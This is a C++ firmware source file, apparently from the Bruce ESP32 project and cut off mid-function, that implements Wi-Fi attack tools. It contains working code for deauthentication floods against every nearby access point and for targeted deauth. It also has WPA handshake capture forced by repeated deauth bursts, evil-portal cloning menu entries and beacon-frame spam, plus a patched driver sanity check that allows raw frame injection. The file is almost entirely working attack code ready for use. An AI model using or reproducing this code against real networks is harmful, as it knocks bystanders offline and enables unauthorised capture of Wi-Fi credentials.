// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions:
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
// C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
#include "wifi_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "deauther.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "evil_portal.h"
#include "more_atks.h"
#include "karma_attack.h"
#include "sniffer.h"
#include "vector"
#include <Arduino.h>
#include <globals.h>
#include <nvs_flash.h>

#define WIFI_ATK_NAME "BruceAttack"
extern bool showHiddenNetworks;

const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

std::vector<wifi_ap_record_t> ap_records;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

uint8_t deauth_frame[sizeof(deauth_frame_default)];

wifi_ap_record_t ap_record;
// Beacon packet template
// clang-format off
constexpr size_t BEACON_PKT_LEN = 109;
const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (placeholder - overwritten)
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (placeholder - overwritten)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (SDK will set)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
    /* 34 - 35 */ 0x31, 0x00, // Capability info (will set WPA flag later)
    /* 36 - 37 */ 0x00, 0x20, // Tag: SSID parameter set, tag length 32 (we will write SSID into bytes 38..69)
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
    /* 70 - 71 */ 0x01, 0x08, // Supported rates tag length 8
    /* 72 */ 0x82,
    /* 73 */ 0x84,
    /* 74 */ 0x8b,
    /* 75 */ 0x96,
    /* 76 */ 0x24,
    /* 77 */ 0x30,
    /* 78 */ 0x48,
    /* 79 */ 0x6c,
    /* 80 - 81 */ 0x03, 0x01, // Current Channel tag
    /* 82 */      0x01,       // Current channel (overwritten)
    /* 83 - 84 */ 0x30, 0x18, // RSN information (start)
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};
// clang-format on
constexpr size_t BEACON_TAIL_OFFSET = 70;
constexpr size_t BEACON_TAIL_LEN = BEACON_PKT_LEN - BEACON_TAIL_OFFSET;
constexpr size_t BEACON_TAIL_CHANNEL_OFFSET = 82 - BEACON_TAIL_OFFSET;

static inline size_t prepareBeaconPacket(
    uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
    uint8_t channel, bool setWPAflag = true
) {
    if (ssidLen > 32) ssidLen = 32;
    memcpy(outPacket, beaconPacketTemplate, 38);
    memcpy(&outPacket[10], macAddr, 6);
    memcpy(&outPacket[16], macAddr, 6);
    outPacket[37] = ssidLen;
    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }
    memcpy(&outPacket[38 + ssidLen], &beaconPacketTemplate[BEACON_TAIL_OFFSET], BEACON_TAIL_LEN);
    outPacket[38 + ssidLen + BEACON_TAIL_CHANNEL_OFFSET] = channel;
    return 38 + ssidLen + BEACON_TAIL_LEN;
}

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
    if (nChannels == 0) return;
    channelIndex = (channelIndex + 1) % nChannels;
    uint8_t ch = channels[channelIndex];
    if (ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

void wifi_complete_cleanup(bool wait) {
    Serial.println("[WIFI_ATK] Complete WiFi cleanup");
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    if (wait) delay(300);
}

void checkHeap(const char *tag) {
    uint32_t currentHeap = ESP.getFreeHeap();
    Serial.printf("[HEAP] %s - Free: %ld\n", tag, currentHeap);
}

void resetGlobalState() {
    options.clear();
    options.shrink_to_fit();
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    returnToMenu = false;
    tft.fillScreen(bruceConfig.bgColor);
}

void send_raw_frame(const uint8_t *frame_buffer, int size) {
    for (int i = 0; i < 3; i++) {
        wifiRawTx(WIFI_IF_AP, frame_buffer, size);
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
    Serial.print("\nPreparing deauth frame to AP -> ");
    for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
    }
    if (memcmp(target, _default_target, 6) != 0) {
        Serial.print(" and Tgt: ");
        for (int j = 0; j < 6; j++) {
            Serial.print(target[j], HEX);
            if (j < 5) Serial.print(":");
        }
    }

    esp_err_t err;
    err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) Serial.println("Error changing channel");
    vTaskDelay(50 / portTICK_PERIOD_MS);
    memcpy(&deauth_frame[4], target, 6);
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
}

void wifi_atk_info(const String &tssid, const String &mac, uint8_t channel) {
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
    tft.drawString("AP: " + tssid, 10, 48);
    tft.drawString("Channel: " + String(channel), 10, 66);
    tft.drawString(mac, 10, 84);
    tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
    vTaskDelay(200 / portTICK_PERIOD_MS);
    SelPress = false;

    while (1) {
        if (check(SelPress)) {
            returnToMenu = false;
            return;
        }
        if (check(EscPress)) {
            returnToMenu = true;
            return;
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}

bool wifi_atk_setWifi() {
    checkHeap("Wifi atk start");

    if (WiFi.getMode() != WIFI_MODE_NULL) { return true; }

    wifi_complete_cleanup();

    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            displayError("Failed starting WIFI", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
        uint8_t randomChannel = random(1, 12);

        int attempts = 0;
        bool apStarted = false;
        while (attempts < 5 && !apStarted) {
            apStarted = WiFi.softAP(WIFI_ATK_NAME, emptyString, randomChannel, 1, 4, false);
            if (!apStarted) {
                delay(100);
                attempts++;
            }
        }

        if (!apStarted) {
            displayError("Failed starting AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return true;
}

bool wifi_atk_unsetWifi() {
    if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
        if (!WiFi.softAPdisconnect()) {
            displayError("Failed Stopping AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (!WiFi.isConnected() && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) wifiDisconnect();

    return true;
}

void wifi_atk_menu() {
    resetGlobalState();

    if (WiFi.getMode() == WIFI_MODE_NULL) wifi_complete_cleanup(false);

    checkHeap("Wifi menu start");

    bool scanAtks = false;
    options = {
        {"Target Atks",     [&]() { scanAtks = true; }     },
#ifndef LITE_VERSION
        {"Karma Attack",    [=]() { karma_setup(); }       },
#endif
        {"Beacon SPAM",     [=]() { beaconAttack(); }      },
        {"Deauth Flood",    [=]() { deauthFloodAttack(); } },
        {"Enhanced Deauth", [=]() { enhancedDeauthMenu(); }},
        {"More Attacks",    [=]() { moreAtkMenu(); }       },
    };
    addOptionToMainMenu();
    loopOptions(options);
    if (!returnToMenu) {
        if (!wifi_atk_setWifi()) return;
    }
    if (scanAtks) {
        int nets;
        displayTextLine("Scanning..");
        nets = WiFi.scanNetworks(false, showHiddenNetworks);
        ap_records.clear();
        options = {};
        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memset(&record, 0, sizeof(record));
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
            if (strlen(WiFi.SSID(i).c_str()) > 0) {
                strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
                record.ssid[sizeof(record.ssid) - 1] = '\0';
            } else {
                record.ssid[0] = '\0';
            }

            ap_records.push_back(record);

            String ssid = WiFi.SSID(i);
            int encryptionType = WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);
            int32_t ch = WiFi.channel(i);
            String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
            String encryptionTypeStr;
            switch (encryptionType) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                case WIFI_AUTH_WPA3_PSK: encryptionTypeStr = "WPA3/PSK"; break;
                case WIFI_AUTH_WPA2_WPA3_PSK: encryptionTypeStr = "WPA2/WPA3/PSK"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }

            String displaySSID = ssid;
            if (displaySSID.length() == 0) { displaySSID = "<Hidden SSID> " + WiFi.BSSIDstr(i); }

            String optionText = encryptionPrefix + displaySSID + " (" + String(rssi) + "|" +
                                encryptionTypeStr + "|ch." + String(ch) + ")";

            options.push_back({optionText.c_str(), [=]() {
                                   ap_record = ap_records[i];
                                   target_atk_menu(
                                       WiFi.SSID(i).c_str(),
                                       WiFi.BSSIDstr(i),
                                       static_cast<uint8_t>(WiFi.channel(i))
                                   );
                               }});
        }

        addOptionToMainMenu();

        loopOptions(options);
        options.clear();
        ap_records.clear();
        ap_records.shrink_to_fit();
    }
    wifi_atk_unsetWifi();
    checkHeap("Wifi menu end");
}

void deauthFloodAttack() {
    cleanlyStopWebUiForWiFiFeature();
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    int nets;
ScanNets:
    displayTextLine("Scanning..");
    nets = WiFi.scanNetworks(false, showHiddenNetworks);
    ap_records.clear();
    for (int i = 0; i < nets; i++) {
        wifi_ap_record_t record;
        memset(&record, 0, sizeof(record));
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = static_cast<uint8_t>(WiFi.channel(i));
        if (strlen(WiFi.SSID(i).c_str()) > 0) {
            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
            record.ssid[sizeof(record.ssid) - 1] = '\0';
        } else {
            record.ssid[0] = '\0';
        }
        ap_records.push_back(record);
    }
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescan_counter = millis();
    uint16_t count = 0;
    uint8_t channel = 0;
    drawMainBorderWithTitle("Deauth Flood");
    while (true) {
        for (const auto &record : ap_records) {
            channel = record.primary;
            wsl_bypasser_send_raw_frame(&record, record.primary, _default_target);
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(record.primary) + "    ");
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Deauth Flood");
            tft.setCursor(10, tftHeight - 25);
            tft.print("Frames:               ");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(channel) + "    ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescan_counter > 60000) goto ScanNets;

        if (check(EscPress)) break;
    }
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

uint8_t targetBssid[6];
#if !defined(LITE_VERSION)
void capture_handshake(const String &tssid, const String &mac, uint8_t channel) {
    cleanlyStopWebUiForWiFiFeature();

    hsTracker = HandshakeTracker();

    uint8_t bssid_array[6];
    sscanf(
        mac.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &bssid_array[0],
        &bssid_array[1],
        &bssid_array[2],
        &bssid_array[3],
        &bssid_array[4],
        &bssid_array[5]
    );

    memcpy(ap_record.bssid, bssid_array, 6);
    memcpy(targetBssid, bssid_array, 6);
    ap_record.primary = channel;

    String encryptionTypeStr = "Unknown";
    for (int i = 0; i < ap_records.size(); i++) {
        if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
            switch (ap_records[i].authmode) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                case WIFI_AUTH_WPA3_PSK: encryptionTypeStr = "WPA3/PSK"; break;
                case WIFI_AUTH_WPA2_WPA3_PSK: encryptionTypeStr = "WPA2/WPA3/PSK"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }
            break;
        }
    }

    String sanitizedSsid = "";
    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
        char c = tssid[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
            c == '_' || c == '.') {
            sanitizedSsid += c;
        } else {
            sanitizedSsid += '_';
        }
    }
    if (sanitizedSsid.length() == 0) {
        char bssidHex[32];
        sprintf(
            bssidHex,
            "%02X%02X%02X%02X%02X%02X",
            bssid_array[0],
            bssid_array[1],
            bssid_array[2],
            bssid_array[3],
            bssid_array[4],
            bssid_array[5]
        );
        sanitizedSsid = String("HIDDEN_") + String(bssidHex);
    }

    FS *fs;
    if (setupSdCard()) {
        fs = &SD;
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP/handshakes")) {
            SD.mkdir("/BrucePCAP");
            SD.mkdir("/BrucePCAP/handshakes");
        }
    } else {
        fs = &LittleFS;
        isLittleFS = true;
        if (!LittleFS.exists("/BrucePCAP/handshakes")) {
            LittleFS.mkdir("/BrucePCAP");
            LittleFS.mkdir("/BrucePCAP/handshakes");
        }
    }

    Serial.print("Target BSSID: ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", bssid_array[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();

    checkHeap("Handshake start");

    wifi_complete_cleanup();

    if (!WiFi.mode(WIFI_MODE_APSTA)) {
        displayError("Failed starting WIFI", true);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    if (!sniffer_prepare_storage(fs, !isLittleFS)) {
        displayError("Sniffer queue error", true);
        return;
    }

    ch = channel;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(channel, secondCh);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    int deauthCount = 0;
    int initialNumEAPOL = num_EAPOL;
    int prevNumEAPOL = initialNumEAPOL;
    bool hasBeacons = false;
    unsigned long autoDeauthTimer = millis();
    unsigned long countdownTick = 0;

    enum { SCANNING, MONITORING, CAPTURED } phase = SCANNING;

    bool needRedraw = true;

    auto sendDeauthBurst = [&]() {
        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
        for (int i = 0; i < 5; i++) {
            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
        deauthCount += 5;
        needRedraw = true;
        autoDeauthTimer = millis();
    };

    auto deauthInterval = [&]() -> unsigned long { return (phase == SCANNING) ? 10000UL : 15000UL; };

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);

    sendDeauthBurst();

    while (true) {
        BeaconList targetBeacon;
        memcpy(targetBeacon.MAC, bssid_array, 6);
        targetBeacon.channel = channel;
        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) { hasBeacons = true; }

        if (num_EAPOL > prevNumEAPOL) {
            prevNumEAPOL = num_EAPOL;
            needRedraw = true;
        }

        if (handshakeUsable(hsTracker)) {
            phase = CAPTURED;
        } else if (hsTracker.msg1 && phase == SCANNING) {
            phase = MONITORING;
        }

        if (phase != CAPTURED && millis() - countdownTick >= 3000) {
            needRedraw = true;
            countdownTick = millis();
        }

        if (needRedraw) {
            drawMainBorderWithTitle("Handshake Capture");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("");
            padprintln("SSID: " + tssid);
            padprintln("BSSID: " + mac);
            padprintln("Security: " + encryptionTypeStr);

            if (phase == CAPTURED) {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                padprintln("Status: CAPTURED!");
            } else if (hasBeacons) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: " + String(phase == MONITORING ? "Monitoring..." : "Scanning..."));
            } else {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Waiting...");
            }

            if (tftHeight > 135) {
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else {
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                padprint("EAPOL MSG:");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                tft.print(" 1");
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                tft.print(" 2");
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                tft.print(" 3");
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                tft.print(" 4");
                if (hsTracker.msg1 && hsTracker.msg2 && hsTracker.msg3 && hsTracker.msg4) {
                    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                    tft.println(" > All Captured");
                } else tft.println("");
            }

            padprint("Deauth sent: " + String(deauthCount));
            if (phase != CAPTURED) {
                unsigned long remaining = deauthInterval() - (millis() - autoDeauthTimer);
                if (remaining > deauthInterval()) remaining = 0;
                tft.println(", more in " + String(remaining / 1000) + "s  [OK]");
            } else tft.println();

            if (phase != CAPTURED) {
                padprintln("Press " + String(BTN_ALIAS) + " to deauth");
            } else {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                padprintln("Handshake saved!        ");
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            }
            tft.drawString("Press Esc to exit", 10, tftHeight - 20);

            needRedraw = false;
        }

        if (check(SelPress) && phase != CAPTURED) { sendDeauthBurst(); }

        if (phase != CAPTURED) {
            if (millis() - autoDeauthTimer >= deauthInterval()) { sendDeauthBurst(); }
        }

        if (check(EscPress)) { break; }

        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
    delay(100);
    returnToMenu = true;
}
#endif

void target_atk_menu(const String &tssid, const String &mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
        {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
#ifndef LITE_VERSION
        {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
#endif
        {"More Attacks",        [=]() { moreTargetAtkMenu(tssid, mac, channel); } },
        {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
        {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
        {"Deauth+Clone+Verify", [=]() { EvilPortal(tssid, channel, true, true); }  },
    };
    addOptionToMainMenu();

    int selected = loopOptions(options);
    // Physical Back leaves the page instead of re-rendering it.
    if (selected < 0) return;
    if (returnToMenu) return; // "Main Menu" entry
    goto AGAIN;
}

void target_atk(const String &tssid, const String &mac, uint8_t channel) {
    uint8_t mac_array[6];
    sscanf(
        mac.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &mac_array[0],
        &mac_array[1],
        &mac_array[2],
        &mac_array[3],
        &mac_array[4],
        &mac_array[5]
    );

    eth_addr eth;
    memcpy(eth.addr, mac_array, 6);
    ip4_addr_t ip;
    ip.addr = 0;
    Host target(&ip, &eth);

    stationDeauth(target);
}

void generateRandomWiFiMac(uint8_t *mac) {
    mac[0] = (random(0, 255) & 0xFC) | 0x02;
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7;
    for (int i = 0; i < len; ++i) { randomName[i] = charset[rand() % strlen(charset)]; }
    randomName[len] = '\0';
    return randomName;
}

char emptySSID[32];
const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                "Abraham Linksys\n"
                                "Benjamin FrankLAN\n"
                                "Martin Router King\n"
                                "John Wilkes Bluetooth\n"
                                "Pretty Fly for a Wi-Fi\n"
#ifndef LITE_VERSION
                                "Bill Wi the Science Fi\n"
                                "I Believe Wi Can Fi\n"
                                "Tell My Wi-Fi Love Her\n"
                                "No More Mister Wi-Fi\n"
                                "LAN Solo\n"
                                "The LAN Before Time\n"
                                "Silence of the LANs\n"
                                "House LANister\n"
                                "Winternet Is Coming\n"
                                "Ping's Landing\n"
                                "The Ping in the North\n"
                                "This LAN Is My LAN\n"
                                "Get Off My LAN\n"
                                "The Promised LAN\n"
                                "The LAN Down Under\n"
                                "FBI Surveillance Van 4\n"
                                "Area 51 Test Site\n"
                                "Drive-By Wi-Fi\n"
                                "Planet Express\n"
                                "Wu Tang LAN\n"
                                "Darude LANstorm\n"
                                "Never Gonna Give You Up\n"
                                "Hide Yo Kids, Hide Yo Wi-Fi\n"
                                "Loading…\n"
                                "Searching…\n"
                                "VIRUS.EXE\n"
                                "Virus-Infected Wi-Fi\n"
                                "Starbucks Wi-Fi\n"
#endif
                                "Text 64ALL for Password\n"
                                "Yell BRUCE for Password\n"
                                "The Password Is 1234\n"
                                "Free Public Wi-Fi\n"
                                "No Free Wi-Fi Here\n"
                                "Get Your Own Damn Wi-Fi\n"
                                "It Hurts When IP\n"
                                "Dora the Internet Explorer\n"
                                "404 Wi-Fi Unavailable\n"
                                "Porque-Fi\n"
                                "Titanic Syncing\n"
                                "Test Wi-Fi Please Ignore\n"
                                "Drop It Like It's Hotspot\n"
                                "Life in the Fast LAN\n"
                                "The Creep Next Door\n"
                                "Ye Olde Internet\n"};

const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                      "02 Never gonna let you down\n"
                                      "03 Never gonna run around\n"
                                      "04 and desert you\n"
                                      "05 Never gonna make you cry\n"
                                      "06 Never gonna say goodbye\n"
                                      "07 Never gonna tell a lie\n"
                                      "08 and hurt you\n"};

void beaconSpamList(const char list[]) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int i = 0;
    int ssidsLen = strlen_P(list);

    nextChannel();

    while (i < ssidsLen) {
        char ssidBuf[32];
        int j = 0;
        char tmp;
        do {
            tmp = pgm_read_byte(list + i + j);
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : j - 1;

        generateRandomWiFiMac(macAddr);
        size_t pktLen = prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);
        for (int k = 0; k < 2; k++) {
            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        i += j;
        if (EscPress) break;
    }
}

void beaconSpamSingle(String baseSSID) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int counter = 1;

    nextChannel();

    while (true) {
        String currentSSID = baseSSID + String(counter);
        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
        uint8_t ssidLen = currentSSID.length();

        generateRandomWiFiMac(macAddr);
        size_t pktLen =
            prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);
        for (int k = 0; k < 2; k++) {
            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        counter++;
        if (counter > 9999) {
            counter = 1;
            nextChannel();
        }
        if (EscPress) break;
    }
}

void beaconAttack() {
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    int BeaconMode;
    String txt = "";
    String singleSSID = "";
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    srand(millis());
    options = {
        {"Funny SSID",
         [&]() {
             BeaconMode = 0;
             txt = "Spamming Funny";
         }                        },
        {"Ricky Roll",
         [&]() {
             BeaconMode = 1;
             txt = "Spamming Ricky";
         }                        },
        {"Random SSID",
         [&]() {
             BeaconMode = 2;
             txt = "Spamming Random";
         }                        },
#if !defined(LITE_VERSION)
        {"Single SSID",
         [&]() {
             BeaconMode = 4;
             txt = "Spamming Single";
         }                        },
        {"Custom SSIDs", [&]() {
             BeaconMode = 3;
             txt = "Spamming Custom";
         }},
#endif
    };
    addOptionToMainMenu();
    loopOptions(options);

    wifiConnected = true;
    String beaconFile = "";
    File file;
    FS *fs;
#if !defined(LITE_VERSION)
    if (BeaconMode == 4) {
        singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
        if (singleSSID.length() == 0 || singleSSID == "\x1B") { return; }
    }
#endif
    if (BeaconMode != 3) {
        drawMainBorderWithTitle("WiFi: Beacon SPAM");
        displayTextLine(txt);
    }

    while (1) {
        if (BeaconMode == 0) {
            beaconSpamList(Beacons);
        } else if (BeaconMode == 1) {
            beaconSpamList(rickrollssids);
        } else if (BeaconMode == 2) {
            char *randoms = randomSSID();
            beaconSpamList(randoms);
        }
#if !defined(LITE_VERSION)
        else if (BeaconMode == 4) {
            beaconSpamSingle(singleSSID);
        } else if (BeaconMode == 3) {
            if (!file) {
                options = {};

                fs = nullptr;
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                addOptionToMainMenu();

                loopOptions(options);
                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
                else return;
                file = fs->open(beaconFile, FILE_READ);
                beaconFile = file.readString();
                beaconFile.replace("\r\n", "\n");
